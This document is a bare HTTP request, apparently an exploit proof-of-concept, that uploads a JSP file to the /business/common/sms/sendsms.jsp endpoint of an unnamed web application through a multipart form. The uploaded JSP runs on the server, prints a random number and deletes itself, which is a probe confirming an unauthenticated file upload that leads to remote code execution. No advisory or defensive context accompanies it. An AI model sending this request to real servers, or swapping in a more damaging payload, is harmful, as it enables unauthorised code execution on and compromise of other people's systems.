```yaml
POST /business/common/sms/sendsms.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22

------WebKitFormBoundary03rNBzFMIytvpW22
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary03rNBzFMIytvpW22--
```